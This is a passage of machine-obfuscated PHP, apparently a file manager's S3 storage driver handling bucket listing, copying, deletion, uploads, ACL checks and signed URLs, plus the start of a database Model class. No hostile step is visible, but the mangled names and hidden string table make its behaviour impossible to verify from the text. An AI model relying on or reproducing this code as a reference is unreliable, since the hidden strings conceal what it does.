$_SERVER[ˆûùúÊ¯]; $º»Ìô€« = parse_url(trim($this->domain, $”™Àªá•[8])); $—Ù¸ò“ğ = isset($º»Ìô€«[$”™Àªá•[204]]) ? $º»Ìô€«[$”™Àªá•[204]] : http_type(); $ÖÒÊô­ñ = isset($º»Ìô€«[$”™Àªá•[205]]) ? $º»Ìô€«[$”™Àªá•[205]] : $º»Ìô€«[$”™Àªá•[94]]; if (isset($º»Ìô€«[$”™Àªá•[206]])) { $ÖÒÊô­ñ .= $”™Àªá•[4] . $º»Ìô€«[$”™Àªá•[206]]; } return $—Ù¸ò“ğ . $”™Àªá•[207] . $ÖÒÊô­ñ; } public function pathEncode($ù…“š¥Ó) { $ıÎÚš‰ =& $_SERVER[ˆûùúÊ¯]; return str_replace($ıÎÚš‰[208], $ıÎÚš‰[8], rawurlencode($ù…“š¥Ó)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($ã•†îÏ) { set_timeout(); require_once SDK_DIR . $_SERVER[ˆûùúÊ¯][209]; parent::__construct(); $this->_init($ã•†îÏ); } public function _init($ÊÉéıö) { $this->config = $ÊÉéıö; foreach ($ÊÉéıö as $è†¡ªãÓ => $¬ğŒØ¦­) { if (isset($this->{$è†¡ªãÓ})) { $this->{$è†¡ªãÓ} = $¬ğŒØ¦­; } } $this->endpoint = $ÊÉéıö[$_SERVER[ˆûùúÊ¯][210]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($áÏÙ ¥ = "\166\64") { $this->signVer = $áÏÙ ¥; $this->client->setSignatureVersion($áÏÙ ¥); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $”üàù ñ =& $_SERVER[ˆûùúÊ¯]; $‡Å×¾³à = $this->getBucketCors(); if (!$‡Å×¾³à || !is_array($‡Å×¾³à)) { return !1; } if ($‡Å×¾³à[$”üàù ñ[211]] != $”üàù ñ[212] || $‡Å×¾³à[$”üàù ñ[213]] != $”üàù ñ[212]) { return !1; } $’ã×÷ò‚ = array_map($”üàù ñ[214], $‡Å×¾³à[$”üàù ñ[215]]); if (!is_array($’ã×÷ò‚)) { $’ã×÷ò‚ = array(); } $ñ­²ŸĞ˜ = array($”üàù ñ[216], $”üàù ñ[217], $”üàù ñ[218], $”üàù ñ[219], $”üàù ñ[220]); $ã‚’íÅŸ = array_diff($ñ­²ŸĞ˜, $’ã×÷ò‚); return empty($ã‚’íÅŸ); } public function mkfile($¡‰æô¢Ó, $ …á½§‰ = '', $Â„ßÖ¾¯ = REPEAT_RENAME) { $İ†Ü°‰ = $this->setContent($¡‰æô¢Ó, $ …á½§‰); if ($İ†Ü°‰ !== !1) { return $this->getPathOuter($¡‰æô¢Ó); } return !1; } public function mkdir($ºØ¼¸³, $§óÌÔÅÏ = REPEAT_SKIP) { $ˆ¿¼û© =& $_SERVER[ˆûùúÊ¯]; if (empty($ºØ¼¸³) && $ºØ¼¸³ !== $ˆ¿¼û©[221]) { return !1; } if ($§óÌÔÅÏ && $this->_isFolder($ºØ¼¸³)) { return $this->getPathOuter($ºØ¼¸³); } $ìíÀ´±ê = $this->setContent($ºØ¼¸³, $ˆ¿¼û©[12], !0); if ($ìíÀ´±ê !== !1) { return $this->getPathOuter($ºØ¼¸³); } return !1; } public function copyFile($õš¤‘Å, $ï¦‘²Ñ‹, $ÉÁÌ‡ŒŸ = array()) { $ï„Şæ· =& $_SERVER[ˆûùúÊ¯]; $Æüé’‚ = $this->objectMeta($õš¤‘Å); if (!$Æüé’‚) { return !1; } if ($Æüé’‚[$ï„Şæ·[86]] <= 1024 * 1024 * 200) { $§Û–İ¯Æ = $this->client->copyObject($this->bucket, $õš¤‘Å, $this->bucket, $ï¦‘²Ñ‹, $ï„Şæ·[222], $ÉÁÌ‡ŒŸ); } else { $§Û–İ¯Æ = $this->client->multiCopyObject($this->bucket, $õš¤‘Å, $this->bucket, $ï¦‘²Ñ‹, $ÉÁÌ‡ŒŸ); } $§Û–İ¯Æ = $§Û–İ¯Æ ? $this->getPathOuter($ï¦‘²Ñ‹) : !1; return $§Û–İ¯Æ; } public function moveFile($¼²¶‰ˆÚ, $êõ©Òß) { if ($this->copyFile($¼²¶‰ˆÚ, $êõ©Òß)) { $this->delFile($¼²¶‰ˆÚ); return $this->getPathOuter($êõ©Òß); } return !1; } public function delFile($ÏÛª’‘ ) { return $this->client->deleteObject($this->bucket, $ÏÛª’‘ ); } public function delFolder($É…º»À) { $ğ¥ÅÖ²¿ =& $_SERVER[ˆûùúÊ¯]; if (!$this->exist($É…º»À)) { return !0; } $this->listItemCache = !1; $ëµÕï€ = $this->fileList($É…º»À); $this->listItemCache = !0; $„ğœºÆõ = trim($É…º»À, $ğ¥ÅÖ²¿[8]) . $ğ¥ÅÖ²¿[8]; if (!empty($É…º»À) && $É…º»À !== $ğ¥ÅÖ²¿[221] && !in_array($„ğœºÆõ, $ëµÕï€[$ğ¥ÅÖ²¿[92]])) { $ëµÕï€[$ğ¥ÅÖ²¿[92]][] = $„ğœºÆõ; } $şËñ®ÀÍ = $this->delByBatch($ëµÕï€[$ğ¥ÅÖ²¿[93]]); if (!$şËñ®ÀÍ) { return !1; } $şËñ®ÀÍ = $this->delByBatch($ëµÕï€[$ğ¥ÅÖ²¿[92]]); if (!$şËñ®ÀÍ) { return !1; } return $this->delFile($„ğœºÆõ); } private function delByBatch($¦á°÷ğ¯) { foreach (array_chunk($¦á°÷ğ¯, 1000) as $»Üœ“°) { $ƒù™ãşÇ = $this->client->deleteObjects($this->bucket, $»Üœ“°); if (!$ƒù™ãşÇ) { return !1; } } return !0; } public function rename($È´üÏŸº, $³í°û©) { return $this->renameObject($È´üÏŸº, $³í°û©); } public function listPath($¹ˆÏÇ½™, $Èöıø“ = false) { $£¬Ù¨Ë =& $_SERVER[ˆûùúÊ¯]; $¡ÂÆ¬ Ñ = $this->fileList($¹ˆÏÇ½™, $£¬Ù¨Ë[8], !0); foreach ($¡ÂÆ¬ Ñ[$£¬Ù¨Ë[92]] as $†¯ºù‘¿ => $Á™£Òğë) { $¡ÂÆ¬ Ñ[$£¬Ù¨Ë[92]][$†¯ºù‘¿] = $this->folderInfo($Á™£Òğë, $Èöıø“, $Á™£Òğë); } foreach ($¡ÂÆ¬ Ñ[$£¬Ù¨Ë[93]] as $†¯ºù‘¿ => $Á™£Òğë) { $¡ÂÆ¬ Ñ[$£¬Ù¨Ë[93]][$†¯ºù‘¿] = $this->fileInfo($Á™£Òğë[$£¬Ù¨Ë[42]], $Èöıø“, $Á™£Òğë); } return $¡ÂÆ¬ Ñ; } protected function infoChildren($ÇÃÄÇá®, &$î¾†Ã¶) { $Šİ»“ä÷ =& $_SERVER[ˆûùúÊ¯]; $ñœÅ·ûÍ = $this->fileList($ÇÃÄÇá®, $Šİ»“ä÷[12], !0); $î¾†Ã¶[$Šİ»“ä÷[88]] += count($ñœÅ·ûÍ[$Šİ»“ä÷[92]]); $î¾†Ã¶[$Šİ»“ä÷[87]] += count($ñœÅ·ûÍ[$Šİ»“ä÷[93]]); foreach ($ñœÅ·ûÍ[$Šİ»“ä÷[93]] as $ßÅáÈÜÛ) { if (!$ßÅáÈÜÛ || !$ßÅáÈÜÛ[$Šİ»“ä÷[86]]) { continue; } $î¾†Ã¶[$Šİ»“ä÷[86]] += $ßÅáÈÜÛ[$Šİ»“ä÷[86]]; } } private function fileInfo($•´±×‘…, $°ìŸôÎÌ = false, $€±ĞÏÛ® = array()) { $£óƒëšÛ =& $_SERVER[ˆûùúÊ¯]; $í·»‚ºš = array($£óƒëšÛ[42] => $this->pathThis($•´±×‘…), $£óƒëšÛ[94] => $this->getPathOuter($•´±×‘…), $£óƒëšÛ[43] => $£óƒëšÛ[223], $£óƒëšÛ[184] => $this->ext($•´±×‘…), $£óƒëšÛ[86] => isset($€±ĞÏÛ®[$£óƒëšÛ[86]]) ? $€±ĞÏÛ®[$£óƒëšÛ[86]] : 0); if ($°ìŸôÎÌ) { return $í·»‚ºš; } $í·»‚ºš[$£óƒëšÛ[224]] = $í·»‚ºš[$£óƒëšÛ[95]] = 0; $í·»‚ºš[$£óƒëšÛ[225]] = $í·»‚ºš[$£óƒëšÛ[226]] = !0; if (empty($€±ĞÏÛ®)) { $€±ĞÏÛ® = $this->objectMeta($•´±×‘…); if (!$€±ĞÏÛ®) { return $í·»‚ºš; } } if (isset($€±ĞÏÛ®[$£óƒëšÛ[227]]) && $€±ĞÏÛ®[$£óƒëšÛ[227]]) { $í·»‚ºš[$£óƒëšÛ[228]] = $€±ĞÏÛ®[$£óƒëšÛ[227]]; } if (isset($€±ĞÏÛ®[$£óƒëšÛ[203]])) { $í·»‚ºš[$£óƒëšÛ[95]] = $€±ĞÏÛ®[$£óƒëšÛ[203]]; } if (isset($€±ĞÏÛ®[$£óƒëšÛ[86]])) { $í·»‚ºš[$£óƒëšÛ[86]] = $€±ĞÏÛ®[$£óƒëšÛ[86]]; } return $í·»‚ºš; } private function folderInfo($»Û ş™À, $Ìíœ±üˆ = false, $ ãÉñú = array()) { $ó€ãÖ½ =& $_SERVER[ˆûùúÊ¯]; $„Â‚œ‚ú = array($ó€ãÖ½[42] => $this->pathThis($»Û ş™À), $ó€ãÖ½[94] => $this->getPathOuter($ó€ãÖ½[8] . $»Û ş™À), $ó€ãÖ½[43] => $ó€ãÖ½[85]); if ($Ìíœ±üˆ) { return $„Â‚œ‚ú; } $„Â‚œ‚ú[$ó€ãÖ½[224]] = $„Â‚œ‚ú[$ó€ãÖ½[95]] = 0; $„Â‚œ‚ú[$ó€ãÖ½[225]] = $„Â‚œ‚ú[$ó€ãÖ½[226]] = !0; if ($»Û ş™À == $ó€ãÖ½[12]) { return $„Â‚œ‚ú; } if (empty($ ãÉñú)) { $ ãÉñú = $this->objectMeta(trim($»Û ş™À, $ó€ãÖ½[8]) . $ó€ãÖ½[8]); } if (isset($ ãÉñú[$ó€ãÖ½[203]])) { $„Â‚œ‚ú[$ó€ãÖ½[224]] = $ ãÉñú[$ó€ãÖ½[203]]; } return $„Â‚œ‚ú; } private function fileList($œÀñÒ²Á, $„Ö·ù¥ = '', $„›Õ•ğî = 0) { $š®º‰óÅ =& $_SERVER[ˆûùúÊ¯]; $Â ä¼û = rtrim($œÀñÒ²Á, $š®º‰óÅ[8]) . $š®º‰óÅ[8]; $Æ·’Í‘¨ = $this->listObjs($Â ä¼û, null, null, $„Ö·ù¥); if (!$Æ·’Í‘¨) { return array($š®º‰óÅ[92] => array(), $š®º‰óÅ[93] => array()); } $ı‹½Ìï = $¼¸ì€³† = array(); foreach ($Æ·’Í‘¨[$š®º‰óÅ[229]] as $– ”†) { $…äáŠÛ¤ = $– ”†[$š®º‰óÅ[42]]; if ($…äáŠÛ¤ == $Â ä¼û) { continue; } $É×„Ş§ = isset($– ”†[$š®º‰óÅ[86]]) ? $– ”†[$š®º‰óÅ[86]] : 0; $ú‡ÊèÂô = $É×„Ş§ == 0 && substr($…äáŠÛ¤, strlen($…äáŠÛ¤) - 1, 1) == $š®º‰óÅ[8] ? !0 : !1; $this->cacheMethodInfoSet($…äáŠÛ¤, $ú‡ÊèÂô, $– ”†); if ($ú‡ÊèÂô) { $ı‹½Ìï[] = $…äáŠÛ¤; continue; } $¼¸ì€³†[] = $„›Õ•ğî ? $– ”† : $…äáŠÛ¤; } foreach ($Æ·’Í‘¨[$š®º‰óÅ[230]] as $– ”†) { $ı‹½Ìï[] = $– ”†[$š®º‰óÅ[42]]; $this->cacheMethodInfoSet($– ”†[$š®º‰óÅ[42]], !0); } $this->cacheMethodInfoSet($œÀñÒ²Á, !0); return array($š®º‰óÅ[92] => $ı‹½Ìï, $š®º‰óÅ[93] => $¼¸ì€³†); } private function listObjs($ü¾‘óÃ, $©€‹©æ = null, $£Ò§À¤× = null, $ÆêùšÉ = null) { $ÊşÏš¶ª =& $_SERVER[ˆûùúÊ¯]; $ü¾‘óÃ = trim($ü¾‘óÃ, $ÊşÏš¶ª[8]); $ºáåÆü = empty($ü¾‘óÃ) && $ü¾‘óÃ !== $ÊşÏš¶ª[221] ? $ÊşÏš¶ª[12] : $ü¾‘óÃ . $ÊşÏš¶ª[8]; return $this->client->getBucket($this->bucket, $ºáåÆü, $©€‹©æ, $£Ò§À¤×, $ÆêùšÉ, !0); } public function has($ö ¿®š, $×•²å×‚ = false, $Ì’ª•İ = true) { $–·¿ŠïĞ =& $_SERVER[ˆûùúÊ¯]; $ö ¿®š = trim($ö ¿®š, $–·¿ŠïĞ[8]); $º¾È˜“ = empty($ö ¿®š) && $ö ¿®š !== $–·¿ŠïĞ[221] ? $–·¿ŠïĞ[12] : $ö ¿®š . $–·¿ŠïĞ[8]; $ë£â²Ğß = null; $¬ü£ø¸ = 500; $¡¿¦òÏĞ = $–·¿ŠïĞ[8]; $ÑÙÜ´ƒì = $ú…¢öìÔ = array(); while (!0) { $Ò“š€Á = $this->listObjs($ö ¿®š, $ë£â²Ğß, $¬ü£ø¸, $¡¿¦òÏĞ); if (!$Ò“š€Á) { break; } $ë£â²Ğß = $Ò“š€Á[$–·¿ŠïĞ[231]]; $¢Ö«øò = $Ò“š€Á[$–·¿ŠïĞ[229]]; $ûÍ‚Õ×Ç = $Ò“š€Á[$–·¿ŠïĞ[230]]; if (empty($¢Ö«øò) && empty($ûÍ‚Õ×Ç)) { break; } if (count($¢Ö«øò) == 1 && $¢Ö«øò[0][$–·¿ŠïĞ[42]] == $º¾È˜“) { break; } if ($×•²å×‚) { if (count($¢Ö«øò)) { $¢Ö«øò = array_column($¢Ö«øò, $–·¿ŠïĞ[42]); $ÑÙÜ´ƒì = array_merge($ÑÙÜ´ƒì, $¢Ö«øò); } if (count($ûÍ‚Õ×Ç)) { $ûÍ‚Õ×Ç = array_column($ûÍ‚Õ×Ç, $–·¿ŠïĞ[42]); $ú…¢öìÔ = array_merge($ú…¢öìÔ, $ûÍ‚Õ×Ç); } if ($ë£â²Ğß === null) { break; } continue; } if ($Ì’ª•İ) { if (!empty($¢Ö«øò)) { if (count($¢Ö«øò) > 1 || isset($¢Ö«øò[0][$–·¿ŠïĞ[42]]) && $¢Ö«øò[0][$–·¿ŠïĞ[42]] != $º¾È˜“) { return !0; } } } else { if (!empty($ûÍ‚Õ×Ç)) { return !0; } } if ($ë£â²Ğß === null) { break; } } if ($×•²å×‚) { $ÑÙÜ´ƒì = array_diff($ÑÙÜ´ƒì, array($º¾È˜“)); $ÑÙÜ´ƒì = count(array_unique($ÑÙÜ´ƒì)); $ú…¢öìÔ = count(array_unique($ú…¢öìÔ)); return array($–·¿ŠïĞ[232] => $ÑÙÜ´ƒì, $–·¿ŠïĞ[233] => $ú…¢öìÔ); } return !1; } public function listAll($ÁÜŸ˜—Ï) { $Ò–åÚÄÅ =& $_SERVER[ˆûùúÊ¯]; $ƒèœÖû² = $this->fileList($ÁÜŸ˜—Ï, $Ò–åÚÄÅ[12], !0); $Î¬´¡Œğ = array_to_keyvalue($ƒèœÖû²[$Ò–åÚÄÅ[93]], $Ò–åÚÄÅ[42]); foreach ($ƒèœÖû²[$Ò–åÚÄÅ[92]] as $˜ã÷ã£É) { if (is_string($˜ã÷ã£É)) { $Î¬´¡Œğ[$˜ã÷ã£É] = array($Ò–åÚÄÅ[86] => 0); } } return $this->listAllFiles($ÁÜŸ˜—Ï, $Î¬´¡Œğ); } public function canRead($³ˆŠ…œº) { $ˆÎÚ¬¯ =& $_SERVER[ˆûùúÊ¯]; $ÍôìÆªß = $this->client->getAccessControlPolicy($this->bucket, $³ˆŠ…œº); if (!$ÍôìÆªß) { return !1; } return in_array($ÍôìÆªß, array($ˆÎÚ¬¯[234], $ˆÎÚ¬¯[235], $ˆÎÚ¬¯[236])) ? !0 : !1; } public function canWrite($Ë®÷Ê­„) { $£¹ü‰Ùù =& $_SERVER[ˆûùúÊ¯]; $ò»ü¢¹¤ = $this->client->getAccessControlPolicy($this->bucket, $Ë®÷Ê­„); if (!$ò»ü¢¹¤) { return !1; } return in_array($ò»ü¢¹¤, array($£¹ü‰Ùù[234], $£¹ü‰Ùù[235])) ? !0 : !1; } public function getContent($®øÌïÕÃ) { return $this->client->getObject($this->bucket, $®øÌïÕÃ); } public function setContent($óéüóáı, $À ¶ÙÓ± = '', $›Óå‰Ïå = false) { $‚Æâ†Û =& $_SERVER[ˆûùúÊ¯]; $óéüóáı = $›Óå‰Ïå ? trim($óéüóáı, $‚Æâ†Û[8]) . $‚Æâ†Û[8] : $óéüóáı; $”Æ¼İÖ× = get_file_mime(get_path_ext($óéüóáı)); $±’ŠØÖÁ = $this->client->putObject($À ¶ÙÓ±, $this->bucket, $óéüóáı, $‚Æâ†Û[222], array(), $”Æ¼İÖ×); if (!$±’ŠØÖÁ) { return !1; } if ($›Óå‰Ïå) { return !0; } $this->cacheMethod(null, null); $±’ŠØÖÁ = $this->copyFile($óéüóáı, $óéüóáı, array($‚Æâ†Û[237] => $±’ŠØÖÁ[$‚Æâ†Û[227]])); return $±’ŠØÖÁ ? !0 : !1; } public function fileSubstr($“‹”Ï“–, $ºÃŒÜ­, $ìû„ş€¢) { $öïê®İˆ = $ºÃŒÜ­ + $ìû„ş€¢ - 1; return $this->client->getObject($this->bucket, $“‹”Ï“–, array($_SERVER[ˆûùúÊ¯][238] => "\142\171\164\x65\x73\x3d{$ºÃŒÜ­}\55{$öïê®İˆ}")); } public function upload($¶‘ÚÒ ¬, $°İ“”†”, $ÛÈÈ´‡› = false, $àóå­Š = REPEAT_REPLACE) { $ë”«ìê³ =& $_SERVER[ˆûùúÊ¯]; $¢…õÒØ² = array($ë”«ìê³[237] => @md5_file($°İ“”†”)); $É½¾êú÷ = array($ë”«ìê³[239] => get_file_mime(get_path_ext($¶‘ÚÒ ¬))); if (IO::size($°İ“”†”) <= 1024 * 1024 * 200) { $¦Íµ”ä = $this->client->putObjectFile($°İ“”†”, $this->bucket, $¶‘ÚÒ ¬, $ë”«ìê³[222], $¢…õÒØ², $É½¾êú÷); return !empty($¦Íµ”ä) ? $this->getPathOuter($¶‘ÚÒ ¬) : !1; } $ù™ğß… = $this->client->multiUploadObject($°İ“”†”, $this->bucket, trim($¶‘ÚÒ ¬, $ë”«ìê³[8]), $¢…õÒØ², $É½¾êú÷); return $ù™ğß… ? $this->getPathOuter($¶‘ÚÒ ¬) : !1; } public function download($Áƒ‹–Á‘, $ñ…Ûã—) { if (!@is_dir($this->pathFather($ñ…Ûã—)) && !IO::mkdir($this->pathFather($ñ…Ûã—))) { return !1; } $Ë®¥ÀÔê = $this->client->getObject($this->bucket, $Áƒ‹–Á‘, array(), $ñ…Ûã—); return $Ë®¥ÀÔê !== !1 ? $ñ…Ûã— : !1; } public function link($„øéš”¦, $Å‘ó¦Ú = array()) { $ØáóÖˆ­ =& $_SERVER[ˆûùúÊ¯]; if ($this->signVer == $ØáóÖˆ­[240]) { return $this->client->getAuthenticatedURL($this->bucket, $„øéš”¦, 3600 * 12, $Å‘ó¦Ú); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($„øéš”¦, $ØáóÖˆ­[8]), 3600 * 12, $this->region, array(), !0, $Å‘ó¦Ú); } public function fileOut($ÚÛª‘ºù, $æíçÉâÖ = false, $Ÿİ€İˆ = false, $Ó×–Şå¸ = '') { $ÖÂéğì =& $_SERVER[ˆûùúÊ¯]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÚÛª‘ºù, $æíçÉâÖ, $Ÿİ€İˆ, $Ó×–Şå¸); } if (!$Ÿİ€İˆ) { $Ÿİ€İˆ = $this->pathThis($ÚÛª‘ºù); } $ë°äÂÆä = get_file_mime(get_path_ext($Ÿİ€İˆ)); if ($ë°äÂÆä == $ÖÂéğì[241]) { return parent::fileOut($ÚÛª‘ºù, $æíçÉâÖ, $Ÿİ€İˆ, $Ó×–Şå¸); } $ÑÙá‡ûÔ = array($ÖÂéğì[242] => $ë°äÂÆä); if ($æíçÉâÖ) { $ÑÙá‡ûÔ[$ÖÂéğì[243]] = $ÖÂéğì[244] . rawurlencode($Ÿİ€İˆ); } else { } $¬ÔÃËü = $this->link($ÚÛª‘ºù, $ÑÙá‡ûÔ); $this->fileOutLink($¬ÔÃËü); } public function fileOutServer($ı¡âñÈˆ, $†ÌÊ±Àğ = false, $ßòÊïÑ¥ = false, $é¤¨ÈÍ = '') { parent::fileOut($ı¡âñÈˆ, $†ÌÊ±Àğ, $ßòÊïÑ¥, $é¤¨ÈÍ); } public function fileOutImageServer($ûºªòô , $Š€ñ“¹ = 250) { parent::fileOutImage($ûºªòô , $Š€ñ“¹); } public function hashMd5($ş”Ş¡ø, $ƒ„ï÷ÒÉ = '') { $ªúñ§€ =& $_SERVER[ˆûùúÊ¯]; $‰¨™° = $this->objectMeta($ş”Ş¡ø); if (!$‰¨™°) { return !1; } $ƒ„ï÷ÒÉ = $ƒ„ï÷ÒÉ ? $ƒ„ï÷ÒÉ : _get($‰¨™°, $ªúñ§€[245]); $ƒ„ï÷ÒÉ = $ƒ„ï÷ÒÉ ? $ƒ„ï÷ÒÉ : _get($‰¨™°, $ªúñ§€[227], $ªúñ§€[12]); return $ƒ„ï÷ÒÉ; } public function uploadFormData($ˆ¸ßŸòÀ, $‚É½ÛÆÂ = 3600) { $ø¶áõÚİ =& $_SERVER[ˆûùúÊ¯]; $ÆÆôÖ = $this->pathFather($ˆ¸ßŸòÀ); $³õë²È¨ = $this->client->getHttpUploadPostParams($this->bucket, $ÆÆôÖ, $ø¶áõÚİ[222], $‚É½ÛÆÂ); return array_merge((array) $³õë²È¨, array($ø¶áõÚİ[205] => $this->getHost())); } public function multiUploadFormData($ù×½“€‹, $êÒ†à× = 3600) { $¶ÜñİúÕ =& $_SERVER[ˆûùúÊ¯]; $œá½ğ¯ê = gmdate($¶ÜñİúÕ[246]); $Í«—ˆÛ = array(); $¼¸›’•× = $this->client->getUploadId($this->bucket, $ù×½“€‹, $Í«—ˆÛ); if (!$¼¸›’•×) { return !1; } return array($¶ÜñİúÕ[247] => $¼¸›’•×, $¶ÜñİúÕ[205] => $this->getHost() . $¶ÜñİúÕ[8] . $this->pathEncode($ù×½“€‹), $¶ÜñİúÕ[248] => $œá½ğ¯ê, $¶ÜñİúÕ[104] => $ù×½“€‹); } public function multiUploadAuthData($¿–ôËé, $Ñ™í«ØÂ = array()) { $„ñş«ÁØ =& $_SERVER[ˆûùúÊ¯]; $‰•ãÌé‹ = isset($Ñ™í«ØÂ[$„ñş«ÁØ[248]]) ? $Ñ™í«ØÂ[$„ñş«ÁØ[248]] : gmdate($„ñş«ÁØ[246]); $ªªµÓú = isset($Ñ™í«ØÂ[$„ñş«ÁØ[184]]) ? $Ñ™í«ØÂ[$„ñş«ÁØ[184]] : $„ñş«ÁØ[12]; $¼ù¼¹š¾ = $Ñ™í«ØÂ[$„ñş«ÁØ[104]]; unset($Ñ™í«ØÂ[$„ñş«ÁØ[104]]); if (isset($Ñ™í«ØÂ[$„ñş«ÁØ[249]])) { $Ñ™í«ØÂ[$„ñş«ÁØ[248]] = $‰•ãÌé‹; return $this->listUploadParts($¼ù¼¹š¾, $Ñ™í«ØÂ); } $œëŠ§ÎÅ = array($„ñş«ÁØ[250], $„ñş«ÁØ[12], $„ñş«ÁØ[130], $„ñş«ÁØ[12], "\170\x2d\141\155\x7a\55\x64\x61\164\x65\x3a{$‰•ãÌé‹}", $„ñş«ÁØ[8] . $this->bucket . $„ñş«ÁØ[8] . $this->pathEncode($¼ù¼¹š¾) . $ªªµÓú); if (strpos($ªªµÓú, $„ñş«ÁØ[251]) === 0) { $œëŠ§ÎÅ[0] = $„ñş«ÁØ[252]; } if (isset($Ñ™í«ØÂ[$„ñş«ÁØ[253]]) && $Ñ™í«ØÂ[$„ñş«ÁØ[253]] == $„ñş«ÁØ[254]) { $œëŠ§ÎÅ[0] = $„ñş«ÁØ[254]; } $½ƒèçÄí = implode($„ñş«ÁØ[18], $œëŠ§ÎÅ); $é¦¥½Ùü = base64_encode(hash_hmac($„ñş«ÁØ[255], $½ƒèçÄí, $this->secret, !0)); $×º…ö½ç = $„ñş«ÁØ[256] . $this->accessKey . $„ñş«ÁØ[4] . $é¦¥½Ùü; if (strpos($ªªµÓú, $„ñş«ÁØ[251]) === 0) { return array($„ñş«ÁØ[257] => $×º…ö½ç, $„ñş«ÁØ[248] => $‰•ãÌé‹); } return $×º…ö½ç; } public function listUploadParts($†“åßÕÑ, $˜²ÚÜĞæ = array()) { $­×÷„Ú£ =& $_SERVER[ˆûùúÊ¯]; $ÎèßÄÛè = str_replace($­×÷„Ú£[258], $­×÷„Ú£[12], $˜²ÚÜĞæ[$­×÷„Ú£[184]]); $ Î±ˆì = $this->client->listParts($this->bucket, $†“åßÕÑ, $ÎèßÄÛè); if (!$ Î±ˆì) { return !1; } unset($˜²ÚÜĞæ[$­×÷„Ú£[249]], $˜²ÚÜĞæ[$­×÷„Ú£[253]]); $˜²ÚÜĞæ[$­×÷„Ú£[104]] = $†“åßÕÑ; $½áÑü  = $this->multiUploadAuthData($†“åßÕÑ, $˜²ÚÜĞæ); if (empty($½áÑü )) { return !1; } return array($­×÷„Ú£[257] => $½áÑü , $­×÷„Ú£[248] => $˜²ÚÜĞæ[$­×÷„Ú£[248]], $­×÷„Ú£[259] => $ Î±ˆì); } public function getHost() { return parent::getHost() . $_SERVER[ˆûùúÊ¯][8] . $this->bucket; } public function size($©­±Ùœ¾) { $ã¡˜ò´ö = $this->objectMeta($©­±Ùœ¾); return $ã¡˜ò´ö ? $ã¡˜ò´ö[$_SERVER[ˆûùúÊ¯][86]] : 0; } public function info($˜Ú¬´‡”) { if ($this->isFolder($˜Ú¬´‡”)) { return $this->folderInfo($˜Ú¬´‡”); } else { if ($this->isFile($˜Ú¬´‡”)) { return $this->fileInfo($˜Ú¬´‡”); } } return !1; } public function exist($˜êÀËé) { return $this->isFile($˜êÀËé) || $this->isFolder($˜êÀËé); } public function isFile($å¯›é£¡) { return !$this->isFolder($å¯›é£¡) && $this->objectMeta($å¯›é£¡); } public function isFolder($ò„˜°ê) { return $this->cacheMethod($_SERVER[ˆûùúÊ¯][175], $ò„˜°ê); } protected function objectMeta($§‚éöÉ‹) { return $this->cacheMethod($_SERVER[ˆûùúÊ¯][177], $§‚éöÉ‹); } protected function _objectMeta($š§ıÚ’—) { $¤­´ÜªÓ =& $_SERVER[ˆûùúÊ¯]; $š§ıÚ’— = rtrim($š§ıÚ’—, $¤­´ÜªÓ[8]); try { $û©É‰é = $this->client->getObjectInfo($this->bucket, $š§ıÚ’—); if (!isset($û©É‰é[$¤­´ÜªÓ[245]]) && isset($û©É‰é[$¤­´ÜªÓ[260]])) { $û©É‰é[$¤­´ÜªÓ[245]] = $û©É‰é[$¤­´ÜªÓ[260]]; } } catch (Exception $şÍ´èğ) { $û©É‰é = !1; } if (!$û©É‰é) { } return $û©É‰é; } protected function _isFolder($š™ı¦Óè) { $‰ÉÓìçÍ =& $_SERVER[ˆûùúÊ¯]; $š™ı¦Óè = rtrim($š™ı¦Óè, $‰ÉÓìçÍ[8]); if ($š™ı¦Óè == $‰ÉÓìçÍ[12] || $š™ı¦Óè == $‰ÉÓìçÍ[8]) { return !0; } $Şò·½ü = $this->client->getBucket($this->bucket, $š™ı¦Óè, null, 1); if (empty($Şò·½ü[$‰ÉÓìçÍ[229]])) { return !1; } $·ìˆÏ¼î = $Şò·½ü[$‰ÉÓìçÍ[229]][0][$‰ÉÓìçÍ[42]]; return stripos($·ìˆÏ¼î, $š™ı¦Óè . $‰ÉÓìçÍ[8]) === 0 ? !0 : !1; if (substr($·ìˆÏ¼î, -1) == $‰ÉÓìçÍ[8]) { return !0; } if (get_path_this($·ìˆÏ¼î) == get_path_this($š™ı¦Óè)) { return !1; } return !0; } } goto dÊ‰Á›ö·; FÖˆáƒß¾¦: define($_SERVER[ˆûùúÊ¯][295], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\154\145", "\157\162\x64\145\162", "\141\154\151\141\163", "\150\x61\166\151\156\x67", "\x67\162\157\165\x70", "\154\x6f\x63\x6b", "\x64\151\163\x74\x69\156\x63\x74", "\141\165\164\x6f", "\x66\151\154\164\x65\x72", "\x76\141\154\x69\144\x61\164\x65", "\162\x65\163\x75\154\x74", "\142\x69\x6e\x64", "\164\x6f\153\x65\156"); public function __construct($İÅ‹ä§¨ = '', $ùå¿¡‹Ï = '', $û×Ú°€æ = '') { $‡±Ü®² =& $_SERVER[ˆûùúÊ¯]; $this->_initialize(); if (!empty($İÅ‹ä§¨)) { if (strpos($İÅ‹ä§¨, $‡±Ü®²[10])) { list($this->dbName, $this->name) = explode($‡±Ü®²[10], $İÅ‹ä§¨); } else { $this->name = $İÅ‹ä§¨; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ùå¿¡‹Ï)) { $this->tablePrefix = $‡±Ü®²[12]; } elseif ($‡±Ü®²[12] != $ùå¿¡‹Ï) { $this->tablePrefix = $ùå¿¡‹Ï; } else { $this->tablePrefix = 